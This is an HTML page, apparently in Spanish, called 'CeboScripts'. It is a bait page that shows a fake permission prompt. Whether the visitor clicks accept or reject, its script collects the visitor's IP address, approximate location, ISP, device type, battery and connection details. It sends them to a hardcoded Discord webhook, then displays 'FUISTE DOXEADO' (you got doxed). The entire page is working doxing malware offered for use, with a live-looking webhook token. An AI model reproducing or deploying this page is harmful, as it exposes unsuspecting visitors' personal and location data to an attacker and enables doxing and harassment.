<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CeboScripts</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #000;
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.85);
            backdrop-filter: blur(5px);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 999;
        }
        .modal {
            background: #0a0a0a;
            border: 2px solid #ff0000;
            border-radius: 15px;
            padding: 40px 50px;
            max-width: 450px;
            width: 90%;
            text-align: center;
            box-shadow: 0 0 50px rgba(255,0,0,0.3);
            animation: glow 2s infinite alternate;
        }
        @keyframes glow {
            0% { box-shadow: 0 0 20px rgba(255,0,0,0.2); }
            100% { box-shadow: 0 0 60px rgba(255,0,0,0.6); }
        }
        .modal h2 {
            color: #ff0000;
            font-size: 1.8em;
            margin-bottom: 10px;
            text-shadow: 0 0 20px rgba(255,0,0,0.5);
        }
        .modal p {
            color: #aaa;
            font-size: 0.95em;
            margin-bottom: 25px;
            line-height: 1.5;
        }
        .modal .icon {
            font-size: 3em;
            margin-bottom: 15px;
            display: block;
        }
        .btn-group {
            display: flex;
            gap: 15px;
            justify-content: center;
            flex-wrap: wrap;
        }
        .btn {
            padding: 12px 40px;
            border: none;
            border-radius: 8px;
            font-size: 1.1em;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            min-width: 120px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .btn-accept {
            background: #ff0000;
            color: #fff;
            border: 1px solid #ff0000;
        }
        .btn-accept:hover {
            background: #cc0000;
            transform: scale(1.05);
            box-shadow: 0 0 30px rgba(255,0,0,0.6);
        }
        .btn-reject {
            background: transparent;
            color: #fff;
            border: 1px solid #555;
        }
        .btn-reject:hover {
            background: #222;
            border-color: #ff0000;
            transform: scale(1.05);
        }
        .status {
            margin-top: 15px;
            font-size: 0.8em;
            color: #666;
            display: none;
        }
        .status.show {
            display: block;
            animation: fadeIn 0.5s;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .hidden {
            display: none !important;
        }
        .data-display {
            margin-top: 15px;
            background: #111;
            padding: 10px;
            border-radius: 5px;
            font-size: 0.75em;
            color: #888;
            text-align: left;
            word-break: break-all;
            border: 1px solid #222;
            display: none;
        }
        .data-display.show {
            display: block;
        }
    </style>
</head>
<body>

    <!-- VENTANA EMERGENTE (GUI) -->
    <div class="overlay" id="permissionOverlay">
        <div class="modal">
            <span class="icon">⚠️</span>
            <h2>PERMISO REQUERIDO</h2>
            <p>
                Este sitio necesita acceder a tu información básica<br>
                para continuar. ¿Aceptas?
            </p>
            <div class="btn-group">
                <button class="btn btn-accept" id="btnAccept">ACEPTAR</button>
                <button class="btn btn-reject" id="btnReject">RECHAZAR</button>
            </div>
            <div class="status" id="statusMsg">Enviando datos...</div>
            <div class="data-display" id="dataDisplay"></div>
        </div>
    </div>

    <!-- CONTENIDO PRINCIPAL (se muestra después de aceptar/rechazar) -->
    <div class="main hidden" id="mainContent">
        <h1 style="color:#ff0000; text-shadow:0 0 30px rgba(255,0,0,0.5);">FUISTE DOXEADO</h1>
        <p style="color:#fff;">Ph4ntom ya tiene tus datos.</p>
        <p style="color:#888; font-size:0.8em; margin-top:30px;">Acceso concedido el: <span id="accessTime"></span></p>
    </div>

    <script>
        // ======== CONFIGURACIÓN ========
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1545583807804219432/4NXmuMtLnjKqgQqvZGSG2rXhy8j45SdiYvSAI3aeDFcrZBzObbEpS93HH3DPCYNIwhWD";

        // ======== OBTENER DATOS DEL DISPOSITIVO ========
        async function getDeviceData() {
            const data = {};

            // 1. IP y ubicación
            try {
                const res = await fetch('https://ipapi.co/json/');
                const ipData = await res.json();
                data.ip = ipData.ip || 'No disponible';
                data.ciudad = ipData.city || 'No disponible';
                data.pais = ipData.country_name || 'No disponible';
                data.proveedor = ipData.org || 'No disponible';
                data.region = ipData.region || 'No disponible';
            } catch (e) {
                data.ip = 'Error al obtener';
                data.ciudad = 'Error';
                data.pais = 'Error';
                data.proveedor = 'Error';
                data.region = 'Error';
            }

            // 2. Dispositivo (Android/iOS/PC)
            const ua = navigator.userAgent || '';
            if (/android/i.test(ua)) {
                data.dispositivo = 'Android';
            } else if (/iphone|ipad|ipod/i.test(ua)) {
                data.dispositivo = 'iOS (iPhone/iPad)';
            } else if (/windows/i.test(ua)) {
                data.dispositivo = 'Windows PC';
            } else if (/mac/i.test(ua)) {
                data.dispositivo = 'Mac';
            } else if (/linux/i.test(ua)) {
                data.dispositivo = 'Linux';
            } else {
                data.dispositivo = 'Desconocido';
            }

            // 3. Batería (solo disponible en algunos navegadores)
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    data.bateria = Math.round(battery.level * 100) + '%';
                    data.cargando = battery.charging ? 'Sí' : 'No';
                } else {
                    data.bateria = 'No disponible';
                    data.cargando = 'No disponible';
                }
            } catch (e) {
                data.bateria = 'No disponible';
                data.cargando = 'No disponible';
            }

            // 4. Conexión de Internet (ISP ya lo tenemos arriba)
            // Pero intentamos obtener más info de conexión
            try {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (conn) {
                    data.tipoConexion = conn.effectiveType || 'No disponible';
                    data.descarga = conn.downlink ? conn.downlink + ' Mbps' : 'No disponible';
                } else {
                    data.tipoConexion = 'No disponible';
                    data.descarga = 'No disponible';
                }
            } catch (e) {
                data.tipoConexion = 'No disponible';
                data.descarga = 'No disponible';
            }

            // 5. Proveedor de internet (lo obtenemos de ipapi)
            data.proveedorInternet = data.proveedor;

            // 6. Dirección real (ubicación aproximada)
            data.direccionReal = `${data.ciudad}, ${data.region}, ${data.pais}`;

            // 7. Hora
            data.hora = new Date().toLocaleString();

            // 8. Referrer
            data.referrer = document.referrer || 'Directo';

            // 9. User Agent completo
            data.userAgent = ua;

            return data;
        }

        // ======== ENVIAR A DISCORD ========
        async function sendToDiscord(data, accion) {
            const statusMsg = document.getElementById('statusMsg');
            statusMsg.classList.add('show');
            statusMsg.textContent = '📤 Enviando datos...';

            const embed = {
                color: accion === 'Aceptar' ? 0x00ff00 : 0xffaa00,
                title: `🔴 CeboScripts - ${accion}`,
                fields: [
                    { name: '📍 Dirección Real', value: data.direccionReal || 'No disponible', inline: false },
                    { name: '🌐 IP', value: data.ip || 'No disponible', inline: true },
                    { name: '🏙️ Ciudad', value: data.ciudad || 'No disponible', inline: true },
                    { name: '🌍 País', value: data.pais || 'No disponible', inline: true },
                    { name: '📱 Dispositivo', value: data.dispositivo || 'No disponible', inline: true },
                    { name: '🔋 Batería', value: data.bateria || 'No disponible', inline: true },
                    { name: '⚡ Cargando', value: data.cargando || 'No disponible', inline: true },
                    { name: '📶 Conexión', value: data.tipoConexion || 'No disponible', inline: true },
                    { name: '🏢 ISP', value: data.proveedorInternet || 'No disponible', inline: false },
                    { name: '🕒 Hora', value: data.hora || 'No disponible', inline: false },
                    { name: '💻 User-Agent', value: (data.userAgent || '').substring(0, 300), inline: false },
                    { name: '🔗 Referrer', value: data.referrer || 'Directo', inline: false },
                    { name: '⚡ Acción', value: accion, inline: true }
                ],
                footer: {
                    text: 'CeboScripts • Datos capturados automáticamente'
                },
                timestamp: new Date().toISOString()
            };

            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: 'CeboScripts Logger',
                        content: `📢 **Nuevo registro - ${accion}**`,
                        embeds: [embed]
                    })
                });

                if (response.ok) {
                    statusMsg.textContent = '✅ ¡Datos enviados correctamente!';
                    statusMsg.style.color = '#00ff00';
                    console.log('✅ Enviado correctamente');
                } else {
                    const errorText = await response.text();
                    statusMsg.textContent = `❌ Error ${response.status}`;
                    statusMsg.style.color = '#ff0000';
                    console.error('❌ Error webhook:', response.status, errorText);
                }
            } catch (e) {
                statusMsg.textContent = '❌ Error al enviar';
                statusMsg.style.color = '#ff0000';
                console.error('❌ Error:', e);
            }

            // Mostrar datos en pantalla
            const dataDisplay = document.getElementById('dataDisplay');
            dataDisplay.classList.add('show');
            dataDisplay.innerHTML = `
                <strong>📍 Dirección:</strong> ${data.direccionReal}<br>
                <strong>🌐 IP:</strong> ${data.ip}<br>
                <strong>📱 Dispositivo:</strong> ${data.dispositivo}<br>
                <strong>🔋 Batería:</strong> ${data.bateria}<br>
                <strong>📶 ISP:</strong> ${data.proveedorInternet}
            `;
        }

        // ======== MANEJAR BOTONES ========
        async function handleAction(accion) {
            // Deshabilitar botones
            document.getElementById('btnAccept').disabled = true;
            document.getElementById('btnReject').disabled = true;
            document.getElementById('btnAccept').style.opacity = '0.5';
            document.getElementById('btnReject').style.opacity = '0.5';

            // Obtener datos
            const data = await getDeviceData();

            // Enviar a Discord
            await sendToDiscord(data, accion);

            // Ocultar overlay después de 2 segundos
            setTimeout(() => {
                document.getElementById('permissionOverlay').classList.add('hidden');
                document.getElementById('mainContent').classList.remove('hidden');
                document.getElementById('accessTime').textContent = new Date().toLocaleString();
            }, 2000);
        }

        // ======== EVENT LISTENERS ========
        document.getElementById('btnAccept').addEventListener('click', () => handleAction('Aceptar'));
        document.getElementById('btnReject').addEventListener('click', () => handleAction('Rechazar'));

        // ======== CARGAR DATOS AL INICIAR (para previsualización) ========
        window.onload = async function() {
            // Solo para mostrar algo rápido, no afecta el envío
            const data = await getDeviceData();
            console.log('Datos cargados:', data);
        };
    </script>
</body>
</html>
